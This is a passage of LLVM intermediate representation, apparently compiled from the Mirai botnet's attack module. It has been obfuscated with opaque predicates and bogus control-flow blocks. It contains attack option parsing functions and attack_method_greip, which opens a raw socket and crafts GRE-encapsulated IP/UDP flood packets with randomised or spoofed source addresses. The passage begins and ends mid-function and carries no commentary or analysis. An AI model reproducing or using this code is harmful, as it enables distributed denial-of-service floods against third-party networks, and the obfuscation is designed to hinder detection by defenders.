  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %27

; <label>:86:                                     ; preds = %27
  %87 = load i8*, i8** %17, align 8
  store i8* %87, i8** %13, align 8
  br label %88

; <label>:88:                                     ; preds = %86, %59
  %89 = load i32, i32* @x.13
  %90 = load i32, i32* @y.14
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i8*, i8** %13, align 8
  %98 = load i32, i32* @x.13
  %99 = load i32, i32* @y.14
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i8* %97

originalBBalteredBB:                              ; preds = %originalBB, %4
  %106 = alloca i8*, align 8
  %107 = alloca i8, align 1
  %108 = alloca %struct.attack_option*, align 8
  %109 = alloca i8, align 1
  %110 = alloca i8*, align 8
  %111 = alloca i32, align 4
  store i8 %0, i8* %107, align 1
  store %struct.attack_option* %1, %struct.attack_option** %108, align 8
  store i8 %2, i8* %109, align 1
  store i8* %3, i8** %110, align 8
  store i32 0, i32* %111, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %112 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %113 = load i32, i32* %18, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %115, i32 0, i32 1
  %117 = load i8, i8* %116, align 8
  %118 = zext i8 %117 to i32
  %119 = load i8, i8* %16, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %118, %120
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %122 = load i32, i32* %18, align 4
  %_ = shl i32 %122, 1
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %18, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %124 = load i8*, i8** %13, align 8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %38

; <label>:19:                                     ; preds = %4
  %20 = load i32, i32* @x.17
  %21 = load i32, i32* @y.18
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @inet_addr(i8* %28) #6
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.17
  %31 = load i32, i32* @y.18
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %17
  %39 = load i32, i32* %5, align 4
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %19
  %40 = load i8*, i8** %10, align 8
  %41 = call i32 @inet_addr(i8* %40) #6
  store i32 %41, i32* %5, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %561

; <label>:79:                                     ; preds = %4
  %80 = load i32, i32* @x.19
  %81 = load i32, i32* @y.20
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %79
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.19
  %93 = load i32, i32* @y.20
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %91, label %100, label %103

; <label>:100:                                    ; preds = %originalBBpart2
  %101 = load i32, i32* %10, align 4
  %102 = call i32 @close(i32 %101)
  br label %561

; <label>:103:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %104

; <label>:104:                                    ; preds = %270, %103
  %105 = load i32, i32* %9, align 4
  %106 = load i8, i8* %5, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %273

; <label>:109:                                    ; preds = %104
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %22, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %23, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %24, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i64 1
  %129 = bitcast %struct.iphdr* %128 to %struct.udphdr*
  store %struct.udphdr* %129, %struct.udphdr** %25, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %12, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 52, %144
  %146 = trunc i64 %145 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %109
  %160 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 4
  store i16 %160, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %159, %109
  %164 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 6
  store i8 47, i8* %165, align 1
  %166 = load i32, i32* %21, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 8
  store i32 %166, i32* %168, align 4
  %169 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i32 0, i32 1
  %174 = load i32, i32* %173, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 9
  store i32 %174, i32* %176, align 4
  %177 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %178 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %179 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %178, i32 0, i32 1
  store i16 %177, i16* %179, align 2
  %180 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %181 = bitcast %struct.iphdr* %180 to i8*
  %182 = load i8, i8* %181, align 4
  %183 = and i8 %182, 15
  %184 = or i8 %183, 64
  store i8 %184, i8* %181, align 4
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = bitcast %struct.iphdr* %185 to i8*
  %187 = load i8, i8* %186, align 4
  %188 = and i8 %187, -16
  %189 = or i8 %188, 5
  store i8 %189, i8* %186, align 4
  %190 = load i8, i8* %12, align 1
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 1
  store i8 %190, i8* %192, align 1
  %193 = load i32, i32* %18, align 4
  %194 = sext i32 %193 to i64
  %195 = add i64 28, %194
  %196 = trunc i64 %195 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %13, align 2
  %201 = zext i16 %200 to i32
  %202 = xor i32 %201, -1
  %203 = trunc i32 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %14, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %15, align 1
  %211 = icmp ne i8 %210, 0
  br i1 %211, label %212, label %232

; <label>:212:                                    ; preds = %163
  %213 = load i32, i32* @x.19
  %214 = load i32, i32* @y.20
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %212
  %221 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 4
  store i16 %221, i16* %223, align 2
  %224 = load i32, i32* @x.19
  %225 = load i32, i32* @y.20
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %232

; <label>:232:                                    ; preds = %originalBBpart24, %163
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 6
  store i8 17, i8* %234, align 1
  %235 = call i32 @rand_next()
  %236 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 8
  store i32 %235, i32* %237, align 4
  %238 = load i8, i8* %20, align 1
  %239 = icmp ne i8 %238, 0
  br i1 %239, label %240, label %246

; <label>:240:                                    ; preds = %232
  %241 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 9
  %243 = load i32, i32* %242, align 4
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 9
  store i32 %243, i32* %245, align 4
  br label %254

; <label>:246:                                    ; preds = %232
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 8
  %249 = load i32, i32* %248, align 4
  %250 = sub i32 %249, 1024
  %251 = xor i32 %250, -1
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 9
  store i32 %251, i32* %253, align 4
  br label %254

; <label>:254:                                    ; preds = %246, %240
  %255 = load i16, i16* %16, align 2
  %256 = call zeroext i16 @htons(i16 zeroext %255) #7
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 0
  store i16 %256, i16* %258, align 2
  %259 = load i16, i16* %17, align 2
  %260 = call zeroext i16 @htons(i16 zeroext %259) #7
  %261 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 1
  store i16 %260, i16* %262, align 2
  %263 = load i32, i32* %18, align 4
  %264 = sext i32 %263 to i64
  %265 = add i64 8, %264
  %266 = trunc i64 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #7
  %268 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i32 0, i32 2
  store i16 %267, i16* %269, align 2
  br label %270

; <label>:270:                                    ; preds = %254
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %9, align 4
  br label %104

; <label>:273:                                    ; preds = %104
  br label %274

; <label>:274:                                    ; preds = %560, %273
  store i32 0, i32* %9, align 4
  br label %275

; <label>:275:                                    ; preds = %557, %274
  %276 = load i32, i32* @x.19
  %277 = load i32, i32* @y.20
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %275
  %284 = load i32, i32* %9, align 4
  %285 = load i8, i8* %5, align 1
  %286 = zext i8 %285 to i32
  %287 = icmp slt i32 %284, %286
  %288 = load i32, i32* @x.19
  %289 = load i32, i32* @y.20
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %287, label %296, label %560

; <label>:296:                                    ; preds = %originalBBpart28
  %297 = load i8**, i8*** %11, align 8
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i8*, i8** %297, i64 %299
  %301 = load i8*, i8** %300, align 8
  store i8* %301, i8** %26, align 8
  %302 = load i8*, i8** %26, align 8
  %303 = bitcast i8* %302 to %struct.iphdr*
  store %struct.iphdr* %303, %struct.iphdr** %27, align 8
  %304 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i64 1
  %306 = bitcast %struct.iphdr* %305 to %struct.grehdr*
  store %struct.grehdr* %306, %struct.grehdr** %28, align 8
  %307 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %308 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %307, i64 1
  %309 = bitcast %struct.grehdr* %308 to %struct.iphdr*
  store %struct.iphdr* %309, %struct.iphdr** %29, align 8
  %310 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i64 1
  %312 = bitcast %struct.iphdr* %311 to %struct.udphdr*
  store %struct.udphdr* %312, %struct.udphdr** %30, align 8
  %313 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i64 1
  %315 = bitcast %struct.udphdr* %314 to i8*
  store i8* %315, i8** %31, align 8
  %316 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %317 = load i32, i32* %9, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i64 %318
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i32 0, i32 2
  %321 = load i8, i8* %320, align 4
  %322 = zext i8 %321 to i32
  %323 = icmp slt i32 %322, 32
  br i1 %323, label %324, label %345

; <label>:324:                                    ; preds = %296
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 1
  %330 = load i32, i32* %329, align 4
  %331 = call i32 @ntohl(i32 %330) #7
  %332 = call i32 @rand_next()
  %333 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %334 = load i32, i32* %9, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i64 %335
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i32 0, i32 2
  %338 = load i8, i8* %337, align 4
  %339 = zext i8 %338 to i32
  %340 = lshr i32 %332, %339
  %341 = add i32 %331, %340
  %342 = call i32 @htonl(i32 %341) #7
  %343 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 9
  store i32 %342, i32* %344, align 4
  br label %345

; <label>:345:                                    ; preds = %324, %296
  %346 = load i32, i32* %21, align 4
  %347 = icmp eq i32 %346, -1
  br i1 %347, label %348, label %368

; <label>:348:                                    ; preds = %345
  %349 = load i32, i32* @x.19
  %350 = load i32, i32* @y.20
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %348
  %357 = call i32 @rand_next()
  %358 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 8
  store i32 %357, i32* %359, align 4
  %360 = load i32, i32* @x.19
  %361 = load i32, i32* @y.20
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %368

; <label>:368:                                    ; preds = %originalBBpart212, %345
  %369 = load i16, i16* %13, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  br i1 %371, label %372, label %387

; <label>:372:                                    ; preds = %368
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 3
  store i16 %375, i16* %377, align 4
  %378 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 3
  %380 = load i16, i16* %379, align 4
  %381 = zext i16 %380 to i32
  %382 = sub nsw i32 %381, 1000
  %383 = xor i32 %382, -1
  %384 = trunc i32 %383 to i16
  %385 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 3
  store i16 %384, i16* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %372, %368
  %388 = load i32, i32* @x.19
  %389 = load i32, i32* @y.20
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %387
  %396 = load i16, i16* %16, align 2
  %397 = zext i16 %396 to i32
  %398 = icmp eq i32 %397, 65535
  %399 = load i32, i32* @x.19
  %400 = load i32, i32* @y.20
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
